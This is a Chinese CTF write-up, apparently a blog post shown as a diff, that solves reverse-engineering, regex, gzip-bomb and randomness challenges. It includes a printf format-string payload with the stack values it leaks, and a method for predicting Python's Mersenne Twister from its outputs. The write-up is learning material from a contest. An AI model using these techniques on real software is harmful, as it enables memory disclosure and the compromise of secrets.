+<p>可以看出程序的逻辑是以<code>hash = 1337</code>为初始值，每次输入字母就做<code>hash = (hash * 13337 + val(ch)) % 19260817</code>的操作（<code>val(ch)</code>是字母<code>ch</code>对应的权值）。那么我们需要找出题人第一遍输入得到的<code>prev_hash</code>。</p>
+<p>那我们对存档文件故伎重施，<code>binwalk</code>一把<code>data0</code>，得到文本文件<code>15</code>，足足有40.2KB，里面是以某种格式存储的有层次的数据，搜索文件得到<code>prev_hash = 7748521</code>。有了Hash值，我们还需要知道字串的长度才能获得有限个解，获得字符的个数分布能更好缩小解集。那我们还有两个文件也一起解包了，在<code>savedata/_datasu.ksd.extracted/15</code>中都是像<code> &quot;trail_round2_sel_o&quot; =&gt; int 1</code>这样的项，虽然不大确定，我们可以猜测这个是前一个玩家选择该选项，或者说，程序执行到这个标号的次数。</p>
+<p>我们看到<code>end=17,a=6,e=3,i=1,o=6</code>，end正好是字母的次数+1(<code>&#125;</code>也算一次)，那我们猜测这就是字母的个数分布了，然后就是写个程序暴力枚举，最后得到确实只有一个解，于是flag就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;OOAAAAEAEIEAOOOO&#125;</span><br></pre></td></tr></table></figure>
+
+<p><del>我超，brain power</del></p>
+<p><del>我超，我怎么又是校内一血</del> <del>疑似有点出息了😋</del></p>
+<h2 id="初学C语言"><a href="#初学C语言" class="headerlink" title="初学C语言"></a>初学C语言</h2><h3 id="flag1-7"><a href="#flag1-7" class="headerlink" title="flag1"></a>flag1</h3><p>ICS知识还给老师了(x)，反正就把栈上的东西嗯爆出来就是了。看了一眼程序，原本用的gets变成了fgets貌似没那么好爆，那大概和attacklab不是一个思路。但是printf或许有点说法，我们搜索<code>printf stack overflow</code>找到一个叫做<code>format string attack</code>的漏洞，大概就是printf不会检查他实际参数的个数，如果你格式串的参数个数大于实际参数个数，printf就会假装他有这么多参数，在栈上往上访问到一个被printf认为是他的参数，但实际上不属于printf的内存。然后printf的格式串还可以直接指定引用的是第几个参数，我们可以构造以下payload:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s %llx %<span class="number">25</span>$llx</span><br></pre></td></tr></table></figure>
+
+<p>其中25代表printf的”第25个参数“，并且25可以换成其他的任意数。我们手动枚举一下，发现26~29的东西或许比较有用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Please input your instruction:</span><br><span class="line">%s %llx %29$llx</span><br><span class="line">a_public_string deadbeef a7d797a34655f</span><br><span class="line"></span><br><span class="line">Please input your instruction:</span><br><span class="line">%s %llx %28$llx</span><br><span class="line">a_public_string deadbeef 6f735f656430635f</span><br><span class="line"></span><br><span class="line">Please input your instruction:</span><br><span class="line">%s %llx %27$llx</span><br><span class="line">a_public_string deadbeef 66544e3152505f44</span><br><span class="line"></span><br><span class="line">Please input your instruction:</span><br><span class="line">%s %llx %26$llx</span><br><span class="line">a_public_string deadbeef 3465527b67616c66</span><br></pre></td></tr></table></figure>
+
+<p>从序号从小到大把他拼成16进制串<code>0a7d797a34655f6f735f656430635f66544e3152505f443465527b67616c66</code>，去掉开头的0a，可以看得出来这是ascii码串，再把它转化成对应的字符串，得到我们的flag1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Re4D_PR1NTf_c0de_so_e4zy&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>flag2卡在这里了，这我看不到源代码想不明白这flag2咋操作的，不会惹。</p>
+<h2 id="绝妙的多项式"><a href="#绝妙的多项式" class="headerlink" title="绝妙的多项式"></a>绝妙的多项式</h2><blockquote>
+<p>好消息：今年学会用IDA了</p>
+<p>坏消息：不会反编译到c</p>
+<p>于是把IDA用成了能显示程序块和跳转关系的高级一点的objdump(x)</p>
+<p>用了十几张草稿纸嗯推汇编，感觉自己要长脑子了（错乱）</p>
+</blockquote>
+<p>因为直接放汇编代码不是很直观，下面放的是手推出来的、功能上相同的C代码。</p>
+<h3 id="flag1-8"><a href="#flag1-8" class="headerlink" title="flag1"></a>flag1</h3><p>flag1的代码大致如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">string input;</span><br><span class="line">cin &gt;&gt; input;</span><br><span class="line"><span class="type">int</span> n = input.<span class="built_in">length</span>();</span><br><span class="line"><span class="built_in">assert</span>(n == <span class="number">0x24</span>);</span><br><span class="line"><span class="type">int</span> *M = <span class="built_in">malloc</span>(<span class="number">4</span> * n);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++) &#123;</span><br><span class="line">    <span class="type">int</span> tmp;</span><br><span class="line">    mint::<span class="built_in">mint</span>(&amp;tmp, input[i]);</span><br><span class="line">    M[i] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>;j &lt;= n;j++) &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;c &lt; n;c++) &#123;</span><br><span class="line">        <span class="type">int</span> r = mint::<span class="keyword">operator</span>*(&amp;M[c], b);</span><br><span class="line">        mint::<span class="keyword">operator</span>+=(&amp;a, r);</span><br><span class="line">        <span class="type">int</span> d;</span><br><span class="line">        mint::<span class="built_in">mint</span>(&amp;d, j);</span><br><span class="line">        mint::<span class="keyword">operator</span>*=(&amp;b, d);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">assert</span>(arr[j - <span class="number">1</span>] == a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以从符号名看的出来，<code>mint</code>应该是一个类的名字，然后看他和<code>int</code>无缝兼容x的样子，我们可以猜测<code>mint</code>的成员就是一个<code>int</code>，他的作用就是在<code>int</code>型的基础上重载他的operator。那关键在于他是如何重载operator的，<del>可能有聪明的小伙伴已经猜到了答案但是先别急，</del>我们看一下<code>mint::operator+</code>函数的汇编：</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob20_1.png"></p>
+<p>看看对应的c代码(类型先全都标成<code>int</code>)：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> mint::<span class="keyword">operator</span>+(<span class="type">int</span> *a, <span class="type">int</span> b) &#123;</span><br><span class="line">	<span class="type">int</span> c = a + b;</span><br><span class="line">    <span class="keyword">if</span>(c &gt; <span class="number">0x3B800000</span>) c -= <span class="number">0x3B800001</span>;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>嗯？好像更熟悉了，不确定，再看看。我们看看这个<code>0x3B800001</code>是个啥：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 0x3B800001                                                                             998244353    </span><br></pre></td></tr></table></figure>
+
+<p>我超，典中典模数。这不就是模998244353意义下的加法吗？那该不会这个mint定义的就是模998244353上的运算吧？</p>
+<p>……还真是……</p>
+<p>我们重新整理一下flag1的代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">string input;</span><br><span class="line">cin &gt;&gt; input;</span><br><span class="line"><span class="type">int</span> n = input.<span class="built_in">length</span>();</span><br><span class="line"><span class="built_in">assert</span>(n == <span class="number">0x24</span>);</span><br><span class="line"></span><br><span class="line">mint *M = <span class="built_in">malloc</span>(<span class="number">4</span> * n);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++) &#123;</span><br><span class="line">    M[i] = input[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>;j &lt;= n;j++) &#123;</span><br><span class="line">    mint a = <span class="number">1</span>, b = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;c &lt; n;c++) &#123;</span><br><span class="line">        a += M[c] * b;</span><br><span class="line">        b *= (mint)j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">assert</span>(arr[j - <span class="number">1</span>] == a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的限制相当于在模意义下解<br>$$<br>\begin{pmatrix}<br>1^1 &amp; 1^2 &amp; \cdots &amp; 1^n \<br>2^1 &amp; 2^2 &amp; \cdots &amp; 2^n \<br>\cdots &amp;  &amp;  &amp; \cdots \<br>n^1 &amp; n^2 &amp; \cdots &amp; n^n<br>\end{pmatrix} \operatorname{input} &#x3D; \operatorname{arr}<br>$$<br>，这就要用到高斯消元法。用模意义下的高斯消元法，我们解得flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;yoU_Are_THE_mA$T3r_of_l@gR4nGe&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag2-6"><a href="#flag2-6" class="headerlink" title="flag2"></a>flag2</h3><p>由以上的经验我们直接整理出以下关键代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">string input; cin &gt;&gt; input; <span class="type">int</span> n = input.<span class="built_in">length</span>();</span><br><span class="line"><span class="built_in">assert</span>(n == <span class="number">45</span>);</span><br><span class="line">mint *M = <span class="built_in">malloc</span>(<span class="number">64</span> * <span class="number">4</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">45</span>;i++) M[i] = input[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">32</span>;i &gt;= <span class="number">1</span>;i &gt;&gt;= <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; m;j += <span class="number">2</span>i) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>;k &lt; i;k++) &#123;</span><br><span class="line">            mint r = M[j + k], s = M[i + j + k];</span><br><span class="line">            M[j + k] = s + r;</span><br><span class="line">            M[i + j + k] = (r - s) * B[i + k];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">64</span>;i++) <span class="built_in">assert</span>(M[i] == A[i]);</span><br></pre></td></tr></table></figure>
+
+<p>这个看上去非常具有分治美感的东西勾起了我的既视感，但好像这道题直接求逆操作就好了，因为他给的B都是有模意义下的逆元的，所以我们直接反过来做一遍，如<code>flag2.cpp</code>，得到了flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;yOU_kN0w_wH47_1S_f4$t_fOuRiEr_7r4n$F0RM&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我去，FFT！怪不得嫩熟悉。</p>
+<h3 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h3><p>接着进行一个人肉的反编译，但感觉有点恶心了：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">string input; cin &gt;&gt; input; <span class="type">int</span> n = input.<span class="built_in">length</span>();</span><br><span class="line"><span class="built_in">assert</span>(n == <span class="number">40</span>);</span><br><span class="line"><span class="type">int</span> m = <span class="number">64</span>;</span><br><span class="line">mint *M1 = <span class="built_in">malloc</span>(<span class="number">2</span> * m * <span class="number">4</span>), *M2 = <span class="built_in">malloc</span>(<span class="number">2</span> * m * <span class="number">4</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++) M1[i] = input[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; n;j++) M2[j] = A[<span class="built_in">phi</span>(j)]; <span class="comment">// ?</span></span><br><span class="line"><span class="built_in">Fun1</span>(M1, <span class="number">128</span>); <span class="built_in">Fun1</span>(M2, <span class="number">128</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">128</span>;i++) M1[i] *= M2[i];</span><br><span class="line"><span class="built_in">Func2</span>(M1, <span class="number">128</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">64</span>;i++) <span class="built_in">assert</span>(M1[i] == G[i]);</span><br></pre></td></tr></table></figure>
+
+<p>里面那个<code>phi</code>	其实是一系列的汇编操作，应该是将j映射到一个&lt;128的整数，当时精神状态爆炸了所以就不管他了，但好像确实没必要管，gdb在这句后面打个断点看看里面存了啥就是了。</p>
+<p>然后这里的<code>Fun1</code>函数其实就是flag2中的fft变换，然后我们看看<code>Func2</code>：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Func2</span><span class="params">(mint* M, <span class="type">int</span> m)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ... what looks like part of ifft()</span></span><br><span class="line">    mint t = ???;</span><br><span class="line">    std::<span class="built_in">reverse</span>(&amp;M[<span class="number">1</span>], &amp;M[m]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">128</span>;i++) M[i] *= T;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于我们只能确认结果的前64个值，所以像刚才那样的直接逆操作是做不了的，我们必须思考一下他的运算的性质。</p>
+<p>我们发现他在Func2的reverse之前，做的实际上是计算<code>ifft(fft(M1) * fft(M2))</code>，上学期学过的工程数学的仅剩的记忆告诉我们：这样的操作其实等价于在算M1和M2的卷积。具体是怎么卷的呢？</p>
+<p>我们写个程序测试一下，发现对输入<code>M1=&#123;1,1,1,1&#125;,M2=&#123;1,2,3,4&#125;</code>，可以看到<code>part_ifft(fft(M1) * fft(M2))</code>结果为<code>&#123;128,0,...,0,512,896,1152,1280,768,384&#125;</code>，把他进行<code>reverse(&amp;M[1],&amp;M[m])</code>，再<code>/=128</code>,就是<code>&#123;1,3,6,10,9,7,4&#125;</code>，而这就是M1和M2的卷积！所以我们有:</p>
+<p>$M_1 \ast M_2 [0:64]  \cdot 128 \equiv G \cdot t \mod 998244353$</p>
+<p>这可以转化成方程组然后像flag1一般解决。</p>
+<p>最后一个关键的问题是怎么求t，汇编如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, 0C4800000h</span><br><span class="line">cdq</span><br><span class="line">idiv    dword ptr [rbp-4Ch]</span><br><span class="line">lea     edx, [rax+3B800001h]</span><br></pre></td></tr></table></figure>
+
+<p>我一开始认为是</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> t = <span class="number">998244353</span> + <span class="number">0x0C480000</span> / <span class="number">128</span>;</span><br></pre></td></tr></table></figure>
+
+<p>但是解出来的东西显然不对，自闭了很久的我以为是代码逻辑有问题，check了好久，最后蚌埠住了，直接用gdb把这个值拉了出来，解得flag3：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Welcome_t0_7hE_WorlD_Of_Po1YNoMi@l&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>做完感觉整个人都飘起来了😇哎呀米诺</p>
+</blockquote>
+<h2 id="关键词过滤喵，谢谢喵"><a href="#关键词过滤喵，谢谢喵" class="headerlink" title="关键词过滤喵，谢谢喵"></a>关键词过滤喵，谢谢喵</h2><blockquote>
+<p>查询出题人精神状态x</p>
+<p>看皮套人看的 (顶着这个b id说这话完全没有说服力x)</p>
+</blockquote>
+<blockquote>
+<p>从文件的变量命名可以看得出来精神不正常的大概是我x 但是看到那个”别急急急急急急喵“确实能让我急了😡喵喵喵，喵糯米糍粑😡😡😡</p>
+</blockquote>
+<p>因为程序太长就不贴完整版了。</p>
+<h3 id="flag1-9"><a href="#flag1-9" class="headerlink" title="flag1"></a>flag1</h3><p>思路是和十进制法表示数字类似，但个十百千万用不同的emoji表示。</p>
+<p>我们先把所有字符变成🐶，然后我们一步步把10个🐶凑成代表十的emoji，以此类推。我们假设长度不超过9999999，那么就需要7个emoji。然后我们根据emoji的个数在后面加数字：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  如果看到【😘】就跳转到【有😘】喵</span><br><span class="line">  如果看到【.*】就跳转到【😘加0】喵</span><br><span class="line">有😘：</span><br><span class="line">  如果看到【😘😘😘😘😘😘😘😘😘】就跳转到【😘加9】喵</span><br><span class="line">  如果看到【😘😘😘😘😘😘😘😘】就跳转到【😘加8】喵</span><br><span class="line">  ... ...</span><br><span class="line">😘加9：</span><br><span class="line">  把【^(.*)$】替换成【\1q】喵</span><br><span class="line">  如果看到【.*】就跳转到【😘好了】喵</span><br><span class="line">  ... ...</span><br><span class="line">😘加0：</span><br><span class="line">  把【^(.*)$】替换成【\1f】喵</span><br><span class="line">  如果看到【.*】就跳转到【😘好了】喵</span><br><span class="line">😘好了：</span><br></pre></td></tr></table></figure>
+
+<p>（为什么我们不在后面加9,…,0而是加q,…,d这样的字母？因为加数字的话可能会被认为和前面的1组成一个两位数，被正则识别成”第10个参数“这样）</p>
+<p>最后去掉前导0即可，得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;W0w_yOU_C4n_rEal1y_REGex&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag2-7"><a href="#flag2-7" class="headerlink" title="flag2"></a>flag2</h3><p>我们先把换行符替换成🐴，然后前面加🐴后面加🤡，这样每两个🐴之间就是一行，去除重复🐴就能让每两个🐴之间是一个空行，像这个样子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🐴a🐴bb🐴ccc🐴🤡</span><br></pre></td></tr></table></figure>
+
+<p>这下我们可以用🐴取字符串，接下来就是比较两个字符串的长度。我一开始想得是冒泡排序，但这样又丑陋又长跑得又慢，我现在怀疑我当时脑子进水了。（事实上我写了，跑了，但是TLE了，sosad）</p>
+<p>仔细一想我们可以用计数排序，在每个非emoji后面加个😅，每次用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把【😅([^🐴😅]*)🐴】替换成【\1🐴】喵</span><br></pre></td></tr></table></figure>
+
+<p>这个能删除每个<code>🐴...🐴</code>中的一个😅，然后我们从左到右重复把🤡左边没有😅的字符串移到右边：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">重复把【^(.*)🐴([^😅🐴]+)🐴(.*)$】替换成【\1🐴🐴\3🐶\2】喵</span><br></pre></td></tr></table></figure>
+
+<p>这里体现出我们用🤡的意义：将输入和输出隔开。右边的🐶起到分隔输出的作用，最后我们删去🤡，将🐶替换成换行符即可，得到flag2：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;caN_C4n_NEEd_Show_sH0w_Way&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag3-2"><a href="#flag3-2" class="headerlink" title="flag3"></a>flag3</h3><blockquote>
+<p>调了嫩久，但是最后发现还是自己啥b了。</p>
+</blockquote>
+<p>首先我们去除&lt;&gt;+-.[]以外的所有字符。接下来我们把这个字符串替换成<code>🐶T😡T🐱😅\1🐭</code>。</p>
+<p>这个字符串代表了当前机器的运行状态：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1)	🐶  (2)  😡  (2)  🐱 (3) 😅 (3) 🐭 (4)</span><br></pre></td></tr></table></figure>
+
+<p>其中🐶🐱🐭将串分成了4个区域：</p>
+<p>(1) 栈区， 用于跳转括号。这里有多少个😭代表了还需要找到多少个异种括号才能停下来。</p>
+<p>(2) 内存区，每个内存单元将一个字节表示成xaa~xpp，对应规则是<code>mem = &quot;x&quot; + (&#39;a&#39; + val / 16) + (&#39;a&#39; + val % 16)</code>（不包含数字的原因在flag1中提到了）。😡是内存区指针，他指向他右边的那个内存单元。</p>
+<p>(3) 代码区，😅是代码区指针，代表正好刚执行完他左边的所有代码。</p>
+<p>(4) 输出区。</p>
+<p>实现就不再赘述，可以见<code>flag3_prog.py</code>。</p>
+<p>但是有几个犯错的点需要记录一下：</p>
+<ol>
+<li>字符转义，正则里面的转义在搜索的时候要加<code>\</code>但是替换的时候不用，但是<code>\</code>字符本身的转义除外。</li>
+<li>括号需要匹配，不是直接找他左&#x2F;右边第一个。</li>
+<li>我的实现中为了进位，采用了如下操作：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">把【😡x(.)a】替换成【😡y\1b】喵</span><br><span class="line">... ...</span><br><span class="line">把【😡x(.)p】替换成【😡y\1q】喵</span><br><span class="line">把【😡yaq】替换成【😡zba】喵</span><br><span class="line">... ...</span><br><span class="line">把【😡ypq】替换成【😡zaa】喵</span><br><span class="line">把【[yz]】替换成【x】喵</span><br></pre></td></tr></table></figure>
+
+<p>这样会导致右边输出部分的y或z字符被替换掉，所以要用别的字符代替y和z在这里的角色。</p>
+<p>于是我们得到flag3：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;wE1c0me_to_THe_MInd_fucK&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="未来磁盘"><a href="#未来磁盘" class="headerlink" title="未来磁盘"></a>未来磁盘</h2><h3 id="flag1-10"><a href="#flag1-10" class="headerlink" title="flag1"></a>flag1</h3><p>原压缩包66.7KB，解压一次得到11.2MB的包，再解压一次得到7个G的包，应该再解压就是原数据了。原本因为电脑性能太拉觉得解不出来，但是第二阶段啥题都不会做了，要不顺便解个包试试，<del>反正只要8小时。</del></p>
+<p>我们需要在这个数据流里面扔掉多余的前置0，找到第一个非0字符，读到再次出现0结束。</p>
+<p>new bing教我gzip后面接管道，然而我跑到一半不知道为啥程序爆了。但我又不会别的命令，就只能自己拿C++写个凑合一下了。如<code>pip.c</code>所示。从23点跑到第二天3点半<del>（没睡着起床看到的）</del>，跑出了大家想看的flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;m0re_GZIP_fi1e_b0mB&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="小章鱼的曲奇"><a href="#小章鱼的曲奇" class="headerlink" title="小章鱼的曲奇"></a>小章鱼的曲奇</h2><h3 id="flag1-11"><a href="#flag1-11" class="headerlink" title="flag1"></a>flag1</h3><p>他输出了一个长度为5058的16进制字串，这也表示了一个长度为2529的字节串。</p>
+<p>观察源代码我们知道，他是把2500个<code>0x00</code>和flag1的字符串对应的二进制串拼在一起（这也说明了flag长度29），然后和一个<code>random.Random</code>对象生成的等长随机byte串异或得到的。由于输出串的前2500个字节其实就是<code>Random</code>生成的随机串，这提示我们应该爆破<code>Random</code>的伪随机数生成算法，也就是梅森旋转算法。经过搜索我们知道<code>random.Random</code>是以32位随机数为一个生成的单位，然后只要知道他输出的624个32位数，就能预测接下来的序列。现在我们正好有625个32位数。我们可以用库<code>rankcrack</code>完成这一操作，代码见<code>flag1.py</code>，我们可以知道flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;RAnd0M_1s_eZ_2_pRED1cT&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag2-8"><a href="#flag2-8" class="headerlink" title="flag2"></a>flag2</h3><p>现在他的输出在flag1的基础上还和其他两个随机数生成器生成的随机串进行了异或，其中一个随机数生成器的种子<code>seed1</code>是他给出的，另一个随机数的种子<code>seed2</code>由我们指定。而且需要<code>seed1 != seed2</code>。</p>
+<p>如果我们能对任意一个给定的<code>seed</code>，都能快速找到另一个不同的<code>seed</code>使得这两个随机数生成器生成相同的数，那我们就能把问题转化成flag1。我搜索了<code>MT19937 seed collision</code>，但是似乎没啥好的结果，那我只能去审计源代码，在<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/5e7727b05232b43589d177c15263d7f4f8c584a0/Lib/random.py#L110">https://github.com/python/cpython/blob/5e7727b05232b43589d177c15263d7f4f8c584a0/Lib/random.py#L110</a>我们可以知道<code>random.Random</code>是继承了<code>_random.Random</code>，而<code>_random</code>的代码在<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/5e7727b05232b43589d177c15263d7f4f8c584a0/Modules/_randommodule.c#L125">https://github.com/python/cpython/blob/5e7727b05232b43589d177c15263d7f4f8c584a0/Modules/_randommodule.c#L125</a>，在Line 306我们找到以下注释：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This algorithm relies on the number being unsigned.</span></span><br><span class="line"><span class="comment"> * So: if the arg is a PyLong, use its absolute value.</span></span><br><span class="line"><span class="comment"> * Otherwise use its hash value, cast to unsigned.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
+
+<p>原来他会对负的种子取绝对值，那么有一个猜想，我们把他给的<code>seed1</code>直接加个负号作为<code>seed2</code>，是否就能获得同样效果的随机数生成器？试了一下，然后把<code>flag1.py</code>改了一下就成了<code>flag2.py</code>，然后跑出来flag：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;crafT1ng_sEED_cAn_b3_FuUun&#125;</span><br></pre></td></tr></table></figure>
+
+<p>…啊？我写完了？</p>
+<h3 id="flag3-3"><a href="#flag3-3" class="headerlink" title="flag3"></a>flag3</h3><p>代码逻辑是他生成100个seed并输出seed，然后你要在10秒内对应给出100个seed，使每组seed生成一样的随机数序列。负号暂且不提，这次代码里甚至没有判重，那我疑似只要把他给的seed直接发回去就…：</p>
